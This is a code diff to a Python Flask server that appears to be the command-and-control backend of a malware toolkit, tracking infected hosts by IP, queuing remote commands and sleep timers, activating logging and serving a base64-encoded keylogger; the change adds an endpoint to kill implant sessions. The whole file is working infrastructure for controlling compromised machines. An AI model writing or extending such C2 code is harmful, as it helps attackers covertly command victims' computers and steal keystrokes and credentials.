@@ -16,6 +16,9 @@ sleeplist = {}
 global keylist
 keylist = []
 
+global kill_list
+kill_list = []
+
 def add_host(guid, IP):
     ses[IP] = guid
 
@@ -44,7 +47,7 @@ def check_in():
         sleep = sleeplist[ip]
         del sleeplist[ip]
         resp = Response()
-        resp.headers["X-Connection-Close"] = sleep
+        resp.headers["X-Connection-State"] = sleep
         return resp, 204 # status code to change sleep time
     elif ip in tasklist:
         command = tasklist[ip]
@@ -56,6 +59,12 @@ def check_in():
         keylist.remove(ip)
         resp = Response()
         resp.headers["X-Logging"] = True
+        return resp, 204
+    elif ip in kill_list:
+        kill_list.remove(ip)
+        del ses[ip]
+        resp = Response()
+        resp.headers["X-Connection-Close"] = True
         return resp, 204
     else:
         return "", 200 # status code to inform to do nothing, stay still
@@ -92,6 +101,13 @@ def transfer_keylogger():
         data = b64encode(content)
     
     return data, 200
+
+@app.route('/kill', methods=['GET'])
+def kill_session():
+    ip = request.args.get('session')
+    kill_list.append(ip)
+
+    return '{"status": "OK"}', 200
 
 
 @app.route('/sleep', methods=['GET'])
